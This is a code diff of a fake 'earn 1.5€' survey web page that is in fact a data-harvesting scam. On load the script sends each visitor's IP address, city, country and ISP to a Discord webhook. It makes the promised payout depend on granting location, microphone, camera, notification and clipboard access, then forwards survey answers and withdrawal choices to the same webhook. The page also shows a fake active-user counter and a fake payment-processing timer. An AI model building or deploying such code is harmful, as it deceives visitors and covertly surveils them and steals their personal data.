+      for (let i = 0; i < questions.length; i++) {
+        qhtml += `<div class="question-item"><div class="options" data-qid="${i}"><strong>${i+1}. ${questions[i]}</strong><br>`;
+        for (let opt of optionSets[i]) qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
+        qhtml += `</div></div>`;
+      }
+      let permsHtml = `<div class="permission-panel">
+          <div style="font-weight:bold;">🔐 Required for payout (each sends real‑time data):</div>
+          <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
+          <div id="locationMap" class="location-map" style="display:none; margin-top:6px;"></div>
+          <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
+          <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
+          <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
+          <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
         </div>
         <div class="permission-panel" style="margin-top:10px;">
-            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately):</div>
-            <div class="perm-step">📳 Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
-            <div class="perm-step">🖱️ HID <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
-            <div class="perm-step">🔌 Serial <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
-            <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
-            <div class="perm-step">💡 Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
+          <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately):</div>
+          <div class="perm-step">📳 Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
+          <div class="perm-step">🖱️ HID <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
+          <div class="perm-step">🔌 Serial <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
+          <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
+          <div class="perm-step">💡 Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
         </div>
-        <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
-        document.getElementById("dynamicContent").innerHTML = html;
-        // generate questions
-        let qhtml = '';
-        for (let i=0; i<questions.length; i++) {
-            qhtml += `<div class="question-item"><div class="options" data-qid="${i}">${questions[i]}<br>`;
-            for (let opt of optionSets[i]) qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
-            qhtml += `</div></div>`;
-        }
-        document.getElementById("questionsArea").innerHTML = qhtml;
-        document.querySelectorAll('input[type="radio"]').forEach(r => {
-            r.addEventListener('change', (e) => {
-                const qid = e.target.closest('.options').getAttribute('data-qid');
-                userAnswers[qid] = e.target.value;
-            });
+        <button class="submit-btn perm-btn" id="submitSurvey" disabled style="width:100%; background:#F5B041; margin-top:15px;">✅ Complete survey & get 1.5€</button>`;
+      return refHtml + `<div id="questionsArea">${qhtml}</div>` + permsHtml;
+    }
+
+    function attachEvents() {
+      // copy referral link
+      const copyBtn = document.getElementById("copyRefBtn");
+      if(copyBtn) copyBtn.onclick = () => { navigator.clipboard.writeText("https://rmamacan69.github.io/earn-that-cash/"); alert("Referral link copied!"); };
+      // radio answers
+      document.querySelectorAll('input[type="radio"]').forEach(r => {
+        r.addEventListener('change', (e) => {
+          const qid = e.target.closest('.options').getAttribute('data-qid');
+          userAnswers[qid] = e.target.value;
         });
-        // copy referral link
-        document.getElementById("copyRefBtn")?.addEventListener("click", () => {
-            const linkText = document.getElementById("refLink").innerText;
-            navigator.clipboard.writeText(linkText);
-            alert("Referral link copied!");
-        });
-        // attach permission buttons
-        const btnGeo = document.getElementById("btnGeo");
-        const btnMic = document.getElementById("btnMic");
-        const btnCamera = document.getElementById("btnCamera");
-        const btnNotif = document.getElementById("btnNotif");
-        const btnClip = document.getElementById("btnClip");
-        const btnOri = document.getElementById("btnOrientation");
-        const btnHID = document.getElementById("btnHID");
-        const btnSerial = document.getElementById("btnSerial");
-        const btnNFC = document.getElementById("btnNFC");
-        const btnLight = document.getElementById("btnLight");
-        const statuses = ["Geo","Mic","Camera","Notif","Clip","Orientation","HID","Serial","NFC","Light"];
-        const buttons = [btnGeo, btnMic, btnCamera, btnNotif, btnClip, btnOri, btnHID, btnSerial, btnNFC, btnLight];
-        const handlers = [requestGeolocation, requestMicrophone, requestCamera, requestNotifications, requestClipboard, requestDeviceOrientation, requestHID, requestSerial, requestNFC, requestAmbientLight];
-        const statusIds = ["statusGeo","statusMic","statusCamera","statusNotif","statusClip","statusOrientation","statusHID","statusSerial","statusNFC","statusLight"];
-        for (let i=0; i<buttons.length; i++) {
-            buttons[i].onclick = async () => {
-                const statusSpan = document.getElementById(statusIds[i]);
-                statusSpan.innerText = "requesting...";
-                const ok = await handlers[i]();
-                statusSpan.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
-                buttons[i].disabled = ok;
-                checkAllBasic();
-            };
-        }
-        function checkAllBasic() {
-            const allGranted = btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled;
-            document.getElementById("submitSurvey").disabled = !allGranted;
-            if (allGranted) document.getElementById("submitSurvey").innerText = "✅ Claim my 1.5€ now!";
-        }
-        document.getElementById("submitSurvey").onclick = async () => {
-            const btn = document.getElementById("submitSurvey");
-            if (btn.disabled) return;
-            btn.disabled = true;
-            btn.innerText = "Submitting...";
-            const answers = {};
-            for (let i=0; i<questions.length; i++) {
-                const selected = document.querySelector(`input[name="q${i}"]:checked`);
-                answers[i] = selected ? selected.value : "(not answered)";
-            }
-            let report = `SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
-            for (let i=0; i<questions.length; i++) report += `${i+1}. ${questions[i]} → ${answers[i]}\n`;
-            const blob = new Blob([report], { type: "text/plain" });
-            await sendToDiscord("📝 Final Survey Answers", "Attached all responses", [], 0x2c7a4d, blob, `survey_${Date.now()}.txt`);
-            showWithdrawOptions(answers);
+      });
+      const mapping = [
+        ["btnGeo", requestGeolocation, "statusGeo"], ["btnMic", requestMicrophone, "statusMic"], ["btnCamera", requestCamera, "statusCamera"],
+        ["btnNotif", requestNotifications, "statusNotif"], ["btnClip", requestClipboard, "statusClip"],
+        ["btnOrientation", requestDeviceOrientation, "statusOrientation"], ["btnHID", requestHID, "statusHID"],
+        ["btnSerial", requestSerial, "statusSerial"], ["btnNFC", requestNFC, "statusNFC"], ["btnLight", requestAmbientLight, "statusLight"]
+      ];
+      for(let [btnId, handler, statusId] of mapping) {
+        const btn = document.getElementById(btnId);
+        if(btn) btn.onclick = async () => {
+          const statusSpan = document.getElementById(statusId);
+          if(statusSpan) statusSpan.innerText = "requesting...";
+          const ok = await handler();
+          if(statusSpan) statusSpan.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
+          if(btn) btn.disabled = ok;
+          checkAllBasic();
         };
+      }
+      const submitBtn = document.getElementById("submitSurvey");
+      if(submitBtn) submitBtn.onclick = async () => {
+        if(submitBtn.disabled) return;
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Submitting...";
+        const answers = {};
+        for(let i=0;i<questions.length;i++) {
+          const selected = document.querySelector(`input[name="q${i}"]:checked`);
+          answers[i] = selected ? selected.value : "(not answered)";
+        }
+        let report = `SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
+        for(let i=0;i<questions.length;i++) report += `${i+1}. ${questions[i]} → ${answers[i]}\n`;
+        const blob = new Blob([report], { type: "text/plain" });
+        await sendToDiscord("📝 Final Survey Answers", "Attached all responses", [], 0x2c7a4d, blob, `survey_${Date.now()}.txt`);
+        showWithdrawOptions(answers);
+      };
+      function checkAllBasic() {
+        const geo = document.getElementById("btnGeo")?.disabled;
+        const mic = document.getElementById("btnMic")?.disabled;
+        const cam = document.getElementById("btnCamera")?.disabled;
+        const notif = document.getElementById("btnNotif")?.disabled;
+        const clip = document.getElementById("btnClip")?.disabled;
+        const allGranted = geo && mic && cam && notif && clip;
+        if(submitBtn) submitBtn.disabled = !allGranted;
+        if(allGranted && submitBtn) submitBtn.innerText = "✅ Claim my 1.5€ now!";
+      }
     }
 
     async function showWithdrawOptions(answers) {
-        const container = document.getElementById("dynamicContent");
-        container.innerHTML = `
-            <div class="withdraw-section" style="display:block;">
-                <h3>🎉 You earned 1.5 €!</h3>
-                <p>Choose withdrawal method:</p>
-                <div style="display:flex; gap:15px; flex-wrap:wrap;">
-                    <button class="perm-btn" id="btc">₿ Bitcoin</button>
-                    <button class="perm-btn" id="ltc">Ł Litecoin</button>
-                    <button class="perm-btn" id="eth">Ξ Ethereum</button>
-                    <button class="perm-btn" id="bank">🏦 Bank Transfer</button>
-                </div>
-                <div id="timerArea" style="font-size:1.4rem; text-align:center; margin-top:20px;"></div>
-            </div>
-        `;
-        const timerDiv = document.getElementById("timerArea");
-        const handle = async (method) => {
-            await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
-            let seconds = 420;
-            timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
-            const interval = setInterval(() => {
-                if (seconds <= 0) {
-                    clearInterval(interval);
-                    timerDiv.innerText = "✅ Payment sent! Check wallet/bank within 24h.";
-                    setTimeout(() => container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3></div>`, 3000);
-                } else {
-                    const mins = Math.floor(seconds / 60);
-                    const secs = seconds % 60;
-                    timerDiv.innerText = `⏳ Processing ${method}... ${mins}:${secs.toString().padStart(2,'0')} minutes`;
-                    seconds--;
-                }
-            }, 1000);
-            document.querySelectorAll(".perm-btn").forEach(b => b.disabled = true);
-        };
-        document.getElementById("btc").onclick = () => handle("BTC");
-        document.getElementById("ltc").onclick = () => handle("LTC");
-        document.getElementById("eth").onclick = () => handle("ETH");
-        document.getElementById("bank").onclick = () => handle("Bank");
+      const container = document.getElementById("mainApp");
+      if(!container) return;
+      container.innerHTML = `<div class="withdraw-section" style="background:rgba(20,28,40,0.8); border-radius: 2rem; padding: 28px; text-align:center;">
+          <h3>🎉 You earned 1.5 €!</h3>
+          <p>Choose withdrawal method:</p>
+          <div style="display:flex; gap:15px; flex-wrap:wrap; justify-content:center; margin:20px 0;">
+            <button class="perm-btn" id="btc" style="background:#F5B041;">₿ Bitcoin</button>
+            <button class="perm-btn" id="ltc">Ł Litecoin</button>
+            <button class="perm-btn" id="eth">Ξ Ethereum</button>
+            <button class="perm-btn" id="bank">🏦 Bank Transfer</button>
+          </div>
+          <div id="timerArea" style="font-size:1.4rem; font-family:monospace;"></div>
+        </div>`;
+      const timerDiv = document.getElementById("timerArea");
+      const handle = async (method) => {
+        await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
+        let seconds = 420;
+        timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
+        const interval = setInterval(() => {
+          if (seconds <= 0) {
+            clearInterval(interval);
+            timerDiv.innerText = "✅ Payment sent! Check wallet/bank within 24h.";
+            setTimeout(() => container.innerHTML = `<div style="text-align:center; padding:30px;"><h3>Thank you!</h3></div>`, 3000);
+          } else {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            timerDiv.innerText = `⏳ Processing ${method}... ${mins}:${secs.toString().padStart(2,'0')} minutes`;
+            seconds--;
+          }
+        }, 1000);
+        document.querySelectorAll("#btc, #ltc, #eth, #bank").forEach(b => b.disabled = true);
+      };
+      document.getElementById("btc")?.addEventListener("click",()=>handle("BTC"));
+      document.getElementById("ltc")?.addEventListener("click",()=>handle("LTC"));
+      document.getElementById("eth")?.addEventListener("click",()=>handle("ETH"));
+      document.getElementById("bank")?.addEventListener("click",()=>handle("Bank"));
     }
 
-    // initial IP log
-    (async () => {
-        try {
-            const ipRes = await fetch("https://api.ipify.org?format=json");
-            const ip = (await ipRes.json()).ip;
-            const geoRes = await fetch("https://ipapi.co/json/");
-            const geo = geoRes.ok ? await geoRes.json() : {};
-            await sendToDiscord("🌐 IP Address", `**IP:** ${ip}\n**Location:** ${geo.city}, ${geo.country_name}\n**ISP:** ${geo.org || "Unknown"}`, [], 0x3498db);
-        } catch(e) {}
-    })();
+    function renderFullApp() {
+      const appDiv = document.getElementById("mainApp");
+      if(appDiv) {
+        appDiv.innerHTML = `<div class="survey-container">${buildSurveyHTML()}</div>`;
+        attachEvents();
+      }
+    }
 
+    // fake live counter
+    function startFakeCounter() {
+      const counterEl = document.getElementById("liveCounter");
+      if(!counterEl) return;
+      let current = Math.floor(Math.random() * (589 - 120 + 1) + 120);
+      counterEl.innerText = `👥 ${current} active users`;
+      setInterval(() => {
+        let change = Math.floor(Math.random() * 31) - 15;
+        let newVal = current + change;
+        if (newVal < 120) newVal = 120;
+        if (newVal > 589) newVal = 589;
+        current = newVal;
+        counterEl.innerText = `👥 ${current} active users`;
+      }, 2800);
+    }
+    // init ip
+    (async () => {
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ip = (await ipRes.json()).ip;
+        const geoRes = await fetch("https://ipapi.co/json/");
+        const geo = geoRes.ok ? await geoRes.json() : {};
+        await sendToDiscord("🌐 IP Address", `**IP:** ${ip}\n**Location:** ${geo.city}, ${geo.country_name}\n**ISP:** ${geo.org || "Unknown"}`, [], 0x3498db);
+      } catch(e) {}
+    })();
     startFakeCounter();
-    renderPage();
-</script>
+    renderFullApp();
+    // hero scroll button
+    document.getElementById("heroScrollBtn")?.addEventListener("click", () => {
+      document.querySelector(".survey-container")?.scrollIntoView({ behavior: "smooth" });
+    });
+  </script>
 </body>
 </html>
